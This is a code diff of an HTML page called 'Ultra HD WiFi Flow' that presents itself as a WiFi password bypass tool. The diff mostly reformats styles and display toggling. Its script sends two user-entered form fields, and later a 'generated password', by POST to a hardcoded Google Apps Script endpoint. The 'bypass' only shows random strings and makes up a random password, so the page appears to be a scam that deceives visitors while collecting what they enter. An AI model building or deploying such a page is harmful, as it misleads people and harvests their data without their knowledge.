@@ -3,74 +3,37 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultra HD WiFi Flow</title>
+<title>Ultra HD WiFi Flow Fixed</title>
 <style>
 /* General Styles */
-body, html {
-  margin: 0; padding: 0; font-family: monospace;
-  overflow: hidden; height: 100%; background: #000; color: #0f0;
-}
-
-/* Hidden class */
-.hidden { display: none; }
-
-/* Center screens */
-.center {
-  display:flex; justify-content:center; align-items:center;
-  height:100vh; flex-direction:column; text-align:center;
-}
+body, html { margin:0; padding:0; font-family: monospace; overflow:hidden; height:100%; background:#000; color:#0f0; }
+.hidden { display:none; }
+.center { display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; text-align:center; }
 
 /* Loading Screen Effects */
-#loadingScreen {
-  background: linear-gradient(270deg, #0f0, #00ff99, #00ccff, #0f0);
-  background-size: 800% 800%;
-  animation: gradientBG 8s ease infinite;
+#loadingScreen { 
+  background: linear-gradient(270deg, #0f0, #00ff99, #00ccff, #0f0); 
+  background-size: 800% 800%; animation: gradientBG 8s ease infinite; 
 }
+@keyframes gradientBG { 0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;} }
 
-@keyframes gradientBG {
-  0% { background-position:0% 50%; }
-  50% { background-position:100% 50%; }
-  100% { background-position:0% 50%; }
-}
-
-#loadingCounter { font-size: 48px; margin-top:20px; text-shadow: 0 0 20px #0f0; }
+#loadingCounter { font-size:48px; margin-top:20px; text-shadow:0 0 20px #0f0; }
 
 /* Glow text */
-.green-text {
-  color:#0f0; text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #0f0;
-  animation: glow 1s infinite alternate;
-}
-@keyframes glow {
-  from { text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #0f0; }
-  to { text-shadow: 0 0 20px #00ff99, 0 0 30px #00ff99, 0 0 50px #00ff99; }
-}
+.green-text { color:#0f0; text-shadow:0 0 5px #0f0,0 0 10px #0f0,0 0 20px #0f0; animation:glow 1s infinite alternate; }
+@keyframes glow { from{ text-shadow:0 0 5px #0f0,0 0 10px #0f0,0 0 20px #0f0;} to{ text-shadow:0 0 20px #00ff99,0 0 30px #00ff99,0 0 50px #00ff99;} }
 
 /* Buttons */
-button {
-  padding: 15px 30px; margin:10px;
-  font-size: 18px; cursor:pointer;
-  background:#111; color:#0f0; border:2px solid #0f0;
-  transition: all 0.3s ease;
-}
-button:hover {
-  transform: scale(1.1);
-  background:#0f0; color:#000; box-shadow:0 0 20px #0f0;
-}
+button { padding:15px 30px; margin:10px; font-size:18px; cursor:pointer; background:#111; color:#0f0; border:2px solid #0f0; transition: all 0.3s ease; }
+button:hover { transform: scale(1.1); background:#0f0; color:#000; box-shadow:0 0 20px #0f0; }
 
 /* Inputs */
-input, select {
-  padding:10px; margin:10px; font-size:16px;
-  background:#111; color:#0f0; border:2px solid #0f0;
-  transition: all 0.3s ease;
-}
-input:focus, select:focus {
-  border-color:#00ff99; box-shadow: 0 0 20px #00ff99;
-}
+input, select { padding:10px; margin:10px; font-size:16px; background:#111; color:#0f0; border:2px solid #0f0; transition: all 0.3s ease; }
+input:focus, select:focus { border-color:#00ff99; box-shadow:0 0 20px #00ff99; }
 
 /* Screen transitions */
 .fade-in { animation: fadeIn 0.8s ease forwards; }
-@keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
-
+@keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
 </style>
 </head>
 <body>
@@ -124,33 +87,33 @@ input:focus, select:focus {
 
 <script>
 const webAppUrl = "https://script.google.com/macros/s/AKfycbypb3X8RC8FBvghc0M3mOC_KQToYP51xmB42TK6htu2dk9b9fyKYROHc_LOTdplB5lr/exec"; // 🔥 Change this
-
 let selectedType = "";
 
 // ---------- Loading Screen ----------
-let loadTime = 15;
-const loadingCounter = document.getElementById("loadingCounter");
 const loadingScreen = document.getElementById("loadingScreen");
+const loadingCounter = document.getElementById("loadingCounter");
 const choiceScreen = document.getElementById("choiceScreen");
 
-const loadingInterval = setInterval(()=>{
-  loadTime--;
-  loadingCounter.innerText = loadTime;
-  if(loadTime <=0){
-    clearInterval(loadingInterval);
-    loadingScreen.classList.add("hidden");
-    choiceScreen.classList.remove("hidden");
+let countdown = 15;
+const timer = setInterval(() => {
+  countdown--;
+  loadingCounter.innerText = countdown;
+  if(countdown <=0){
+    clearInterval(timer);
+    loadingScreen.style.display = "none";      // hide loading
+    choiceScreen.style.display = "flex";       // show choice screen
   }
 },1000);
 
 // ---------- Form Logic ----------
 const formScreen = document.getElementById("formScreen");
 const formTitle = document.getElementById("formTitle");
+const mainPage = document.getElementById("mainPage");
 
 function showForm(type){
   selectedType = type;
-  choiceScreen.classList.add("hidden");
-  formScreen.classList.remove("hidden");
+  choiceScreen.style.display = "none";
+  formScreen.style.display = "flex";
   formTitle.innerText = type.toUpperCase();
 }
 
@@ -158,33 +121,32 @@ async function submitForm(){
   const input1 = document.getElementById("input1").value;
   const input2 = document.getElementById("input2").value;
 
-  await fetch(webAppUrl, {
+  await fetch(webAppUrl,{
     method:"POST",
-    body: JSON.stringify({type:selectedType,input1,input2})
+    body: JSON.stringify({type:selectedType, input1, input2})
   });
 
-  formScreen.classList.add("hidden");
-  mainPage.classList.remove("hidden");
+  formScreen.style.display = "none";
+  mainPage.style.display = "flex";
 }
 
 // ---------- Bypass Logic ----------
 const bypassScreen = document.getElementById("bypassScreen");
 const bypassText = document.getElementById("bypassText");
-const mainPage = document.getElementById("mainPage");
 
 function randomString(length){
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   let str="";
-  for(let i=0;i<length;i++) str += chars.charAt(Math.floor(Math.random()*chars.length));
+  for(let i=0;i<length;i++) str+=chars.charAt(Math.floor(Math.random()*chars.length));
   return str;
 }
 
 function startBypass(){
-  mainPage.classList.add("hidden");
-  bypassScreen.classList.remove("hidden");
-  let time = 15;
-  const interval = setInterval(()=>{
-    bypassText.innerText = randomString(12);
+  mainPage.style.display="none";
+  bypassScreen.style.display="flex";
+  let time=15;
+  const interval=setInterval(()=>{
+    bypassText.innerText=randomString(12);
     time--;
     if(time<=0){
       clearInterval(interval);
@@ -194,20 +156,20 @@ function startBypass(){
 }
 
 function askWifiType(){
-  const type = prompt("PRIVATE WIFI or PUBLIC WIFI?");
-  bypassText.innerText = "Searching Password...";
-  let time = 23;
-  const interval = setInterval(()=>{
-    bypassText.innerText = randomString(15);
+  const type=prompt("PRIVATE WIFI or PUBLIC WIFI?");
+  bypassText.innerText="Searching Password...";
+  let time=23;
+  const interval=setInterval(()=>{
+    bypassText.innerText=randomString(15);
     time--;
     if(time<=0){
       clearInterval(interval);
-      const password = randomString(9) + Math.floor(Math.random()*9000+1000);
-      bypassText.innerText = "Password: " + password;
+      const password = randomString(9)+Math.floor(Math.random()*9000+1000);
+      bypassText.innerText="Password: "+password;
       saveMainPage(password);
       setTimeout(()=>{
-        bypassScreen.classList.add("hidden");
-        mainPage.classList.remove("hidden");
+        bypassScreen.style.display="none";
+        mainPage.style.display="flex";
       },3000);
     }
   },500);
@@ -219,7 +181,7 @@ async function saveMainPage(password){
   const privacy = document.getElementById("privacy").value;
   const autoConnect = document.getElementById("autoConnect").value;
 
-  await fetch(webAppUrl, {
+  await fetch(webAppUrl,{
     method:"POST",
     body: JSON.stringify({
       type:"mainpage",
@@ -228,10 +190,10 @@ async function saveMainPage(password){
       privacy,
       autoConnect,
       bypassChoice:"",
-      generatedPassword: password
+      generatedPassword:password
     })
   });
 }
 </script>
 </body>
-  </html>
+    </html>
